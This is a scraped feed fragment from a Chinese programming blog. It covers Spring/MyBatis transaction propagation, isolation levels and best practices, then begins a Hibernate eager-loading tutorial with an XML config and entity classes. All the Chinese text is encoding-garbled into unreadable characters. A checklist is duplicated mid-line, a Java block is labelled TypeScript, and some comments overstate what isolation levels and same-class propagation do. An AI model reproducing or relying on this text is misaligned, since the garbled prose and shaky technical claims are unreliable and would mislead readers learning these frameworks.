<span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRED</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">methodA</span>(<span class="hljs-params"/>) {
    <span class="hljs-title function_">methodB</span>();  <span class="hljs-comment">// methodBåœ¨æ–°äº‹åŠ¡ä¸­æ‰§è¡Œ</span>
    <span class="hljs-comment">// methodAçš„äº‹åŠ¡è¢«æŒ‚èµ·</span>
}

<span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRES_NEW</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">methodB</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// åœ¨ç‹¬ç«‹äº‹åŠ¡ä¸­æ‰§è¡Œ</span>
}
<span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRED</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">methodA</span>(<span class="hljs-params"/>) {
    <span class="hljs-title function_">methodB</span>();  <span class="hljs-comment">// methodBåœ¨åµŒå¥—äº‹åŠ¡ä¸­æ‰§è¡Œ</span>
    <span class="hljs-comment">// å¦‚æœmethodBå¤±è´¥ï¼Œåªå›æ»šmethodB</span>
}

<span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">NESTED</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">methodB</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// åœ¨åµŒå¥—äº‹åŠ¡ä¸­æ‰§è¡Œ</span>
}
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionalService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">LogService</span> logService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">DataService</span> dataService;

    <span class="hljs-comment">// ä¸»äº‹åŠ¡</span>
    <span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRED</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">businessOperation</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. ä¸šåŠ¡æ“ä½œï¼ˆä¸»äº‹åŠ¡ï¼‰</span>
            dataService.<span class="hljs-title function_">insertData</span>(<span class="hljs-string">"ä¸šåŠ¡æ•°æ®"</span>);

            <span class="hljs-comment">// 2. è®°å½•æ—¥å¿—ï¼ˆç‹¬ç«‹äº‹åŠ¡ï¼‰</span>
            logService.<span class="hljs-title function_">saveLog</span>(<span class="hljs-string">"æ“ä½œæ—¥å¿—"</span>);

            <span class="hljs-comment">// 3. å‘é€é€šçŸ¥ï¼ˆç‹¬ç«‹äº‹åŠ¡ï¼‰</span>
            logService.<span class="hljs-title function_">sendNotification</span>(<span class="hljs-string">"æ“ä½œé€šçŸ¥"</span>);

        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-comment">// ä¸šåŠ¡å¤±è´¥ï¼Œä¸»äº‹åŠ¡å›æ»š</span>
            <span class="hljs-comment">// ä½†æ—¥å¿—è®°å½•å’Œé€šçŸ¥ä¸ä¼šå›æ»š</span>
            <span class="hljs-comment">// ï¼ˆå› ä¸ºä½¿ç”¨äº†REQUIRES_NEWï¼‰</span>
            <span class="hljs-keyword">throw</span> e;
        }
    }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogService</span> {

    <span class="hljs-comment">// ç‹¬ç«‹äº‹åŠ¡è®°å½•æ—¥å¿—</span>
    <span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRES_NEW</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">saveLog</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> message</span>) {
        <span class="hljs-comment">// åœ¨æ–°äº‹åŠ¡ä¸­æ‰§è¡Œ</span>
        <span class="hljs-comment">// æ— è®ºä¸»äº‹åŠ¡æˆåŠŸæˆ–å¤±è´¥ï¼Œæ—¥å¿—éƒ½ä¼šè¢«è®°å½•</span>
        logMapper.<span class="hljs-title function_">insert</span>(message);
    }

    <span class="hljs-comment">// ç‹¬ç«‹äº‹åŠ¡å‘é€é€šçŸ¥</span>
    <span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRES_NEW</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">sendNotification</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> message</span>) {
        <span class="hljs-comment">// åœ¨æ–°äº‹åŠ¡ä¸­æ‰§è¡Œ</span>
        notificationMapper.<span class="hljs-title function_">insert</span>(message);
    }
}
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IsolationLevelService</span> {

    <span class="hljs-comment">// è¯»å·²æäº¤ï¼šå…è®¸ä¸å¯é‡å¤è¯»</span>
    <span class="hljs-meta">@Transactional</span>(isolation = <span class="hljs-title class_">Isolation</span>.<span class="hljs-property">READ_COMMITTED</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">User</span>&gt; <span class="hljs-title function_">listUsers</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> userMapper.<span class="hljs-title function_">selectAll</span>();
    }

    <span class="hljs-comment">// å¯é‡å¤è¯»ï¼šé˜²æ­¢ä¸å¯é‡å¤è¯»å’Œå¹»è¯»</span>
    <span class="hljs-meta">@Transactional</span>(isolation = <span class="hljs-title class_">Isolation</span>.<span class="hljs-property">REPEATABLE_READ</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> <span class="hljs-title function_">getUserWithLock</span>(<span class="hljs-params">Long id</span>) {
        <span class="hljs-keyword">return</span> userMapper.<span class="hljs-title function_">selectByIdForUpdate</span>(id);
    }

    <span class="hljs-comment">// ä¸²è¡ŒåŒ–ï¼šæœ€é«˜éš”ç¦»çº§åˆ«</span>
    <span class="hljs-meta">@Transactional</span>(isolation = <span class="hljs-title class_">Isolation</span>.<span class="hljs-property">SERIALIZABLE</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">criticalOperation</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// ä¸²è¡Œæ‰§è¡Œï¼Œå®Œå…¨éš”ç¦»</span>
    }
}
</code></pre>
<h2 data-id="heading-22">ä¸ƒã€æœ€ä½³å®è·µ</h2>
<p>äº‹åŠ¡ä¼ æ’­å®šä¹‰äº†äº‹åŠ¡æ–¹æ³•è¢«è°ƒç”¨æ—¶äº‹åŠ¡è¾¹ç•Œçš„è¡Œä¸ºã€‚</p>
<h2 data-id="heading-23">7.1 äº‹åŠ¡è¾¹ç•Œåˆ’åˆ†</h2>
<pre><code class="hljs language-java" lang="java">âœ… äº‹åŠ¡èŒƒå›´è¦å° - äº‹åŠ¡å°½å¯èƒ½çŸ­ï¼Œå‡å°‘é”ç«äº‰
âœ… äº‹åŠ¡æ”¾åœ¨Serviceå±‚ - ä¸åœ¨DAOå±‚ç®¡ç†äº‹åŠ¡
âœ… é¿å…é•¿äº‹åŠ¡ - ä¸è¦åœ¨äº‹åŠ¡ä¸­è¿›è¡ŒRPCã€HTTPç­‰å¤–éƒ¨è°ƒç”¨
âœ… æ˜ç¡®äº‹åŠ¡è¾¹ç•Œ - ä½¿ç”¨<span class="hljs-meta">@Transactional</span>æ¸…æ™°æ ‡æ³¨äº‹åŠ¡èŒƒå›´è¦å° - äº‹åŠ¡å°½å¯èƒ½çŸ­ï¼Œå‡å°‘é”ç«äº‰
âœ… äº‹åŠ¡æ”¾åœ¨Serviceå±‚ - ä¸åœ¨DAOå±‚ç®¡ç†äº‹åŠ¡
âœ… é¿å…é•¿äº‹åŠ¡ - ä¸è¦åœ¨äº‹åŠ¡ä¸­è¿›è¡ŒRPCã€HTTPç­‰å¤–éƒ¨è°ƒç”¨
âœ… æ˜ç¡®äº‹åŠ¡è¾¹ç•Œ - ä½¿ç”¨<span class="hljs-meta">@Transactional</span>æ¸…æ™°æ ‡æ³¨
</code></pre>
<h2 data-id="heading-24">7.2 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h2>
<pre><code class="hljs language-ini" lang="ini">1ï¸âƒ£ é€‰æ‹©åˆé€‚çš„éš”ç¦»çº§åˆ« - READ_COMMITTEDé€šå¸¸è¶³å¤Ÿ
2ï¸âƒ£ é¿å…äº‹åŠ¡ä¸­çš„å¤–éƒ¨è°ƒç”¨ - å¦‚ç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶æ“ä½œ
3ï¸âƒ£ æ‰¹é‡æ“ä½œä½¿ç”¨BatchExecutor - æå‡æ‰¹é‡æ“ä½œæ€§èƒ½
4ï¸âƒ£ åˆç†ä½¿ç”¨åªè¯»äº‹åŠ¡ - æŸ¥è¯¢æ“ä½œä½¿ç”¨<span class="hljs-attr">readOnly</span>=<span class="hljs-literal">true</span>
</code></pre>
<h2 data-id="heading-25">7.3 å¸¸è§é—®é¢˜è§£å†³</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// é—®é¢˜ï¼šå¼‚å¸¸è¢«æ•è·ï¼Œäº‹åŠ¡æœªå›æ»š</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ä¸šåŠ¡ä»£ç </span>
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
        e.<span class="hljs-title function_">printStackTrace</span>(); <span class="hljs-comment">// æ•è·å¼‚å¸¸ï¼Œäº‹åŠ¡ä¸å›æ»š</span>
    }
}

<span class="hljs-comment">//è§£å†³ï¼šè¦ä¹ˆæŠ›å‡ºå¼‚å¸¸ï¼Œè¦ä¹ˆæ‰‹åŠ¨å›æ»š</span>
<span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// ä¸šåŠ¡ä»£ç </span>
}
<span class="hljs-comment">// æŸ¥è¯¢æ–¹æ³•ä½¿ç”¨åªè¯»äº‹åŠ¡</span>
<span class="hljs-meta">@Transactional</span>(readOnly = <span class="hljs-literal">true</span>)
<span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">User</span>&gt; <span class="hljs-title function_">listUsers</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> userMapper.<span class="hljs-title function_">selectAll</span>();
}

<span class="hljs-comment">//å¥½å¤„ï¼š</span>
<span class="hljs-comment">//å‘Šè¯‰æ•°æ®åº“è¿™æ˜¯åªè¯»æ“ä½œ</span>
<span class="hljs-comment">//æ•°æ®åº“å¯ä»¥è¿›è¡Œä¼˜åŒ–</span>
<span class="hljs-comment">//å‡å°‘é”ç«äº‰</span>
<span class="hljs-comment">// è®¾ç½®äº‹åŠ¡è¶…æ—¶æ—¶é—´ï¼ˆå•ä½ï¼šç§’ï¼‰</span>
<span class="hljs-meta">@Transactional</span>(timeout = <span class="hljs-number">30</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">longRunningOperation</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å¦‚æœæ–¹æ³•æ‰§è¡Œè¶…è¿‡30ç§’ï¼Œäº‹åŠ¡è‡ªåŠ¨å›æ»š</span>
}
</code></pre>
<p>MyBatisçš„äº‹åŠ¡ç®¡ç†æ¨¡å—æä¾›äº†<strong>çµæ´»è€Œå¼ºå¤§</strong>çš„äº‹åŠ¡æ§åˆ¶èƒ½åŠ›ã€‚</p>
<pre><code class="hljs">1ï¸âƒ£ Transactionæ¥å£ - å®šä¹‰äº‹åŠ¡çš„åŸºæœ¬æ“ä½œ
2ï¸âƒ£ JdbcTransaction - ä½¿ç”¨JDBCåŸç”Ÿæ–¹å¼ç®¡ç†äº‹åŠ¡
3ï¸âƒ£ ManagedTransaction - ç”±å®¹å™¨ç®¡ç†äº‹åŠ¡ç”Ÿå‘½å‘¨æœŸ
4ï¸âƒ£ äº‹åŠ¡æäº¤å’Œå›æ»š - æ ¹æ®æ“ä½œç»“æœå†³å®šæäº¤æˆ–å›æ»š
5ï¸âƒ£ æ¡†æ¶é›†æˆ - ä¸Springç­‰æ¡†æ¶æ— ç¼é›†æˆ
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ19ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„æ€¥åŠ è½½ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7590020026395443254</link>    <guid>https://juejin.cn/post/7590020026395443254</guid>    <pubDate>2026-01-02T23:58:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026395443254" data-draft-id="7589940210832392235" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ19ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„æ€¥åŠ è½½ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T23:58:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ19ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„æ€¥åŠ è½½ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T23:58:16.000Z" title="Fri Jan 02 2026 23:58:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernateçš„æ€¥åŠ è½½ï¼ˆEager Loadingï¼‰æ˜¯ä¸€ç§æ•°æ®åŠ è½½ç­–ç•¥ï¼Œå³åœ¨åŠ è½½å®ä½“æ—¶ç«‹å³åŠ è½½å…¶å…³è”å®ä½“ã€‚è¿™ç§æ–¹å¼é€šè¿‡ä¸€æ¬¡æŸ¥è¯¢è·å–æ‰€æœ‰ç›¸å…³è”çš„æ•°æ®ï¼Œé¿å…åœ¨åç»­è®¿é—®å…³è”æ•°æ®æ—¶é‡å¤æŸ¥è¯¢æ•°æ®åº“ã€‚æ€¥åŠ è½½é€šå¸¸ç”¨äºéœ€è¦é¢‘ç¹è®¿é—®å…³è”æ•°æ®çš„åœºæ™¯ï¼Œä»è€Œæé«˜æŸ¥è¯¢æ•ˆç‡å’Œå‡å°‘æ•°æ®åº“è®¿é—®æ¬¡æ•°ã€‚</p>
<h3 data-id="heading-0">æ€¥åŠ è½½çš„å®ç°</h3>
<p>åœ¨Hibernateä¸­ï¼Œæ€¥åŠ è½½é€šè¿‡åœ¨å…³è”å…³ç³»ä¸ŠæŒ‡å®š<code>FetchType.EAGER</code>æ¥å®ç°ã€‚å¸¸ç”¨äº<code>@OneToMany</code>ã€<code>@ManyToOne</code>ã€<code>@OneToOne</code>ã€<code>@ManyToMany</code>ç­‰å…³è”å…³ç³»ã€‚</p>
<h3 data-id="heading-1">ç¤ºä¾‹ä»£ç </h3>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•åœ¨Hibernateä¸­ä½¿ç”¨æ€¥åŠ è½½ã€‚</p>
<h4 data-id="heading-2">é…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±»é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Course"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">HibernateUtil ç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-4">å®ä½“ç±» Student å’Œ Course</h4>
<h5 data-id="heading-5">Student ç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-meta">@OneToMany(mappedBy = "student", fetch = FetchType.EAGER, cascade = CascadeType.ALL)</span>
    <span class="hljs-keyword">private</span> Set&lt;Course&gt; courses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

